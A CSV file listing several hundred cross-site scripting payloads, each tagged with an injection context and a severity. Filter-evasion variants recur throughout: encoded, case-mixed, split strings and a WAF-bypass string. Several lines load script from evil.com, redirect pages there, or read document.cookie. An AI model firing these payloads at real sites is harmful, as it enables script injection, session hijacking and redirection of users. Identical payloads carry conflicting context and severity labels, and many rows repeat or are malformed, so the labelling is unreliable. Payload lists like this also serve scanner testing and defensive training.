payload,context,severity
' ><img src=x onerror=alert(1)>,attribute_escape,medium
;alert(1);,tag_injection,medium
"""><embed alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<object data=""javascript:alert(1)"">",tag_injection,low
""" onfocus
=alert(	1) autofocus
=""",event_handler,low
</tag><svg onload=alert(1)>,tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
onerror='alert(1)',tag_injection,medium
setInterval('ale'+'rt(10)');,tag_injection,high
""" onload=alert(1) x=""",attribute_escape,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
""" onerror=alert(1) x=""",attribute_escape,low
"onload=""alert(1)""",tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",js_uri,high
"\"" onerror=alert(1)//",dom_sink,medium
.alert(1);,tag_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
onerror='alert(1)',tag_injection,medium
"location=""javascript:al'+'ert(1)""",tag_injection,medium
"""><img src
=x onerror
=alert(	1)>",attribute_escape,high
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
jAvAsCrIpT:CoNfIrM(1),tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,low
<body onload=alert(1)>,event_handler,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<%= confirm(1) %>,template_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
javascript:alert(	document.domain),js_uri,low
"\""><img src=x onload=alert(1)>",script_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"%20""><svg onload=alert(1)>",tag_injection,medium
"<scRiPt>Alert(sTring.fRoMcHarcoDE(88,83,83))</scRipt>",tag_injection,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
${alert(1)},template_injection,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<button ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,medium
' onmouseover=alert(1) ',attribute_escape,high
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
<iframe/onload=alert(0);>,tag_injection,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
setInterval('ale'+'rt(10)');,attribute_escape,high
"<embed src=""javascript:alert(1)"">",script_injection,high
setInterval('ale'+'rt(10)');,tag_injection,high
"<object data=""javascript:al'+'ert(1)"">",tag_injection,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
"<object data=""javascript:confirm(1)"">",tag_injection,high
innerHTML=location.hash>#<script>prompt`1`</script>,tag_injection,high
"<video>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
""" onload=confirm(1) x=""",attribute_escape,high
""" onerror
=alert(	1) x
=""",attribute_escape,low
"javascript:void(document.location=""http://evil.com"")",template_injection,low
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
<img/’onerror=alert(1) src=a>,tag_injection,medium
"eval(""alert(1)"")",script_injection,high
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,high
"<iframe src=""javascript:alert(1)"">",event_handler,medium
jAvAsCrIpT:AlErT(1),js_uri,high
{{constructor.constructor(alert`AnonKryptiQuz`)()}},js_uri,low
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
confirm(),tag_injection,medium
"<sCRIPt>d.inneRHTml+='';</scRiPT>//[""'`-->]]>]</DIV>",tag_injection,high
<img src=x onerror=\u0061\u006cert(1)>,tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
‘ onfocus=’alert(1)’ autofocus=’,tag_injection,medium
alert(2),tag_injection,medium
<script>confirm(1)</script>,event_handler,medium
<textarea>d.innerHTML+='';</script>,tag_injection,high
\x3cdetails open ontoggle=alert(1)\x3e,attribute_escape,low
' onmouseover=alert(1) ',attribute_escape,high
<%= alert(1) %>,script_injection,high
""" onerror=window.alert(1)1 a=""",attribute_escape,medium
alert(1);,tag_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
<svg////////onload=alert(1)>,tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
onerror=prompt(1);>,tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),attribute_escape,medium
<script src=//evil.com/xss.js></script>,js_uri,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<img/src=x onerror=confirm(1)//>,event_handler,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
setInterval('ale'+'rt(10)');,attribute_escape,high
"\"" onload=alert(1)//",attribute_escape,low
${alert(1)},template_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",attribute_escape,medium
"""><svG OnLoaD=ALerT(1)>",attribute_escape,medium
"eval(""alert(1)"")",attribute_escape,medium
"document.write(	""<img src
=x onerror
=alert(	1)>"")",dom_sink,high
<details open ontoggle=alert(1)>,event_handler,medium
javascript:alert(1),event_handler,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
onerror=alert(0);>,tag_injection,medium
confirm(),tag_injection,medium
"onerror=""prompt`1`""",tag_injection,medium
prompt(9),tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
"""><img src=x onerror=alert(1)>",js_uri,medium
<script>alert(document.domain)</script>,script_injection,medium
&lt;marquee onstart=alert(1)&gt;,dom_sink,high
"//"";confirm`1`)",attribute_escape,high
"print())//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
setInterval('ale'+'rt(10)');,tag_injection,high
"%20""><svg onload=alert(1)>",tag_injection,medium
<script>confirm(1)</script>,script_injection,medium
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,high
<body oncut=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
onerror='alert(1)',tag_injection,medium
alert(1),tag_injection,medium
"\"" onerror=alert(1)//",event_handler,high
"""><svg onchange=alert()>",tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
""" onload=alert(1) x=""",attribute_escape,high
"<svg onload=""confirm(7)"">",tag_injection,medium
' onmouseover=alert(1) ',event_handler,high
""" onload=alert(1) x=""",attribute_escape,low
%3Cscript src=//evil.com/xss.js%3E%3C/script%3E,script_injection,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
<BODY ONLOAD=alert(’XSS’)>,attribute_escape,medium
alert(2),tag_injection,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
<img src=x onerror=alert(1)>,tag_injection,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
<%= confirm(1) %>,js_uri,medium
<input onfocus=alert(1) autofocus>,event_handler,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
""" onerror=alert(1) x=""",js_uri,medium
<input onfocus=alert(1) autofocus>,event_handler,low
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
onerror=alert;throw 23;,tag_injection,low
setInterval('ale'+'rt(10)');,tag_injection,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
\' onerror=confirm(1)//,attribute_escape,medium
onload='window.alert(1)',tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"""><embed onload=alert()>",tag_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
onload='self.alert(1)',tag_injection,medium
' onerror=alert(1) x=',js_uri,low
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
\' OnErRoR=AlErT(1)//,attribute_escape,high
javascript:alert(document.domain),js_uri,high
&quot; onerror=confirm(1) x=&quot;,attribute_escape,high
<img src/onerror=prompt(8)>,tag_injection,medium
jAvAsCrIpT:CoNfIrM(1),js_uri,high
jAvAsCrIpT:AlErT(1),js_uri,medium
\' onerror=alert(1)//,attribute_escape,medium
"""></SCRIPT>”>’><SCRIPT>alert(document.domain))</SCRIPT>",tag_injection,high
"<scRiPt>aleRT(sTriNG.FROMChARCodE(88,83,83))</sCripT>",tag_injection,high
"<script	>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
javascript:alert(document.domain),js_uri,low
<img src=x onerror=alert(1)>,tag_injection,medium
<script>alert(1)</script>,generic,medium
OnLOAD='aLERt(1)',tag_injection,medium
{{7*7}},template_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<svg/onload=confirm(1)>,tag_injection,high
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,high
"oNerRor=""alErT(1)""",tag_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"<SCript>aleRT(sTRinG.fROmcharcodE(88,83,83))</scripT>",tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
<img/src=x onerror=confirm(1)//>,dom_sink,high
<img src/onerror=alert(1)>,tag_injection,medium
<svg onload=alert(1)>,event_handler,high
"<svg onload=""confirm(7)"">",tag_injection,medium
' onerror=alert(1) x=',event_handler,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<SCRIPT>confirm(1)</SCRIPT>,script_injection,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
%3Cinput onfocus=alert(1) autofocus%3E,event_handler,medium
[45].some.alert(),tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,attribute_escape,high
&quot; onload=alert(1) x=&quot;,attribute_escape,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",script_injection,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
javascript:alert(	1),tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
</tag><svg onload=alert(1)>,tag_injection,medium
"\"" onerror=alert(1)//",dom_sink,low
"""><script alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
<img src=x onerror=alert(1)>,dom_sink,low
"\""><img src
=x onerror
=alert(	1)>",attribute_escape,medium
"""><script
 alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
onerror='alert(1)',tag_injection,medium
"""><img src=x onerror=alert(1)>",attribute_escape,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
"onload=""alert(1)""",tag_injection,medium
<img/src=x onerror=alert(1)//>,event_handler,medium
<script>alert(1)</script>,tag_injection,medium
<marquee onstart=alert(1)>,event_handler,medium
<img src=x onerror=alert(1)>,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,attribute_escape,low
javascript:confirm(document.domain),js_uri,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
' onerror=alert(1) x=',attribute_escape,medium
innerHTML&#61;location.hash>#<script>alert(1)</script>,tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
<script src=//evil.com/xss.js></script>,script_injection,low
"eval(""confirm(1)"")",event_handler,high
<svg id=1 onload=confirm(1)>,tag_injection,medium
${alert(1)},template_injection,high
alert(1),tag_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
javascript:alert(document.domain),js_uri,medium
"<details open ontoggle
=alert(	1)>",event_handler,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
""" onmouseover=alert()1 a=""",attribute_escape,medium
javascript:confirm(1),js_uri,medium
""" onerror=\u0061\u006cert(1) x=""",attribute_escape,medium
<marquee onstart=alert(1)>,event_handler,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
‘ onfocus=’alert(1)’,tag_injection,medium
onerror=alert;throw 23;,tag_injection,low
"eval(""confirm(1)"")",dom_sink,medium
<img src/onerror=prompt(8)>,tag_injection,medium
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
prompt(9),tag_injection,medium
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"<object data=""javascript:confirm(1)"">",tag_injection,low
<BODY ONLOAD=alert(’XSS’)>,tag_injection,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
"data:text/html,<script>alert(1)</script>",js_uri,high
"""><%00script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
\' onload=alert(1)//,attribute_escape,medium
location='javascript:ale'+'rt(12)';,script_injection,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"eval(""alert(1)"")",dom_sink,low
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
setInterval('ale'+'rt(10)');,tag_injection,high
<script>alert(1)</script>,script_injection,low
-alert(1)-',tag_injection,medium
<body onsearch=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",attribute_escape,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"{{constructor.constructor(""alert(1)"")()}}",dom_sink,low
<body onload=alert(1)>,event_handler,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"eval(""al'+'ert(1)"")",dom_sink,low
"\""><img src=x onerror=alert(1)>",attribute_escape,high
"onload=""alert(1)""",tag_injection,medium
"<iframe>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
;alert(1);,tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
alert(2),tag_injection,medium
"\""><iMg sRc=x oNeRrOr=aLeRt(1)>",event_handler,low
<marquee onstart=alert(1)>,event_handler,low
{{7*7}},template_injection,medium
<svg onload=alert()>,attribute_escape,medium
javascript:alert(document.domain),js_uri,high
"\x3cembed src=""javascript:alert(1)""\x3e",tag_injection,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<scr/**/ipt>alert(document.domain)</scr/**/ipt>,script_injection,high
seTinterVAL('ALE'+'Rt(10)');,tag_injection,high
{{7*7}},template_injection,low
{{7*7}},template_injection,medium
confirm`1`,attribute_escape,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
javascript:confirm(1),js_uri,low
"<embed src=""javascript:confirm(1)"">",template_injection,high
${alert(1)},template_injection,low
<img/src/onerror=alert(1),tag_injection,medium
\' OnErRoR=AlErT(1)//,attribute_escape,medium
{{$emit.constructor`alert(1)`()}},js_uri,medium
<video src=x onload=alert(1)>,event_handler,high
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
<svg onload=alert(1)>,event_handler,low
"onload=""alert(document.cookie)""",tag_injection,medium
setInterval('ale'+'rt(10)');,tag_injection,high
<scr/**/ipt>confirm(1)</scr/**/ipt>,script_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
{{7*7}},template_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
